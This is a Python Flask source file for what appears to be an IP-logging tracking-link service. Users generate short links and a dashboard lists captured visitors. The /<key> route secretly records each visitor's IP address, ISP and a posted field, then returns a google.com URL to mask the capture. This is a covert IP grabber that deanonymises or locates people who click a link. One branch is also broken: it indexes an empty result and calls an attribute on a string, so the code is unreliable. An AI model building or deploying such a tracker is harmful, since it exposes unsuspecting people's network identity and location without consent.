from app import app, db
from flask import jsonify, request, redirect, render_template
with app.app_context():
    db.create_all()
from app import models
from app import ip 
from app import auth
import requests, json

@app.route("/")
def home():
    return jsonify({'isp':{'ip':ip.ip(),'isp':ip.isp()}})

@app.route('/glink')
def generate_link():
    check_user = models.User.query.filter_by(user_ip=ip.ip()).all()
    if(not check_user):
        add_user = models.User(user_ip=ip.ip(), user_isp = str(ip.isp()) , browser_info = str(request.user_agent), timezone = auth.times())
        add_key = models.Links(user_ip=ip.ip(), key = auth.key(10), browser_info = str(request.user_agent), timezone = auth.times())
        db.session.add(add_user)
        db.session.add(add_key)
        db.session.commit()
        return jsonify({'success':"Successfully Generate Link ."})
    return redirect("/mylink")

@app.route("/mylink")
def my_link():
    link = models.Links.query.filter_by(user_ip=ip.ip()).all()
    if(link):
        return jsonify({'Link':f"{request.root_url}{link[0].key}"})
    else:
        return redirect("/glink")
 
@app.route("/mycli")
def my_cli():
    client_info = models.ClientInfo.query.filter_by(user_ip=ip.ip()).all()
    if(client_info):
        cli = {}
        client_count = 0
        for x in client_info:
            client_count += 1
            cli[f"{x.client_ip} {auth.key(3)}"] = {'user_ip':x.user_ip,'client_ip':x.client_ip,"client_info":x.client_info,'client_user_agent':x.client_user_agent,'client':client_count}
        return jsonify({'MyCLI':json.loads(json.dumps(cli))})
        # return render_template('index.html',cli=client_info)
    else:
        return redirect("/mylink")
    
    
@app.route("/<key>",methods=['GET','POST'])
def demo(key):
    if(request.method=='POST'):
        link = models.Links.query.filter_by(key=key).all()
        if(link):
            add_client_info = models.ClientInfo(user_ip=link[0].user_ip, key=key,  client_info=str(ip.isp()), client_ip=ip.ip(), client_user_agent=str(request.form['msg']))
            db.session.add(add_client_info)
            db.session.commit()
        else:
            add_client_info = models.ClientInfo(user_ip=str(f'admin {link[0].user_ip}').user_ip, key=key,  client_info=str(ip.isp()),client_ip=ip.ip(), client_user_agent=str(request.form['msg']))
            db.session.add(add_client_info)
            db.session.commit()
        return jsonify({"msg":"https://google.com/"})
    else:
        return render_template("index.htm")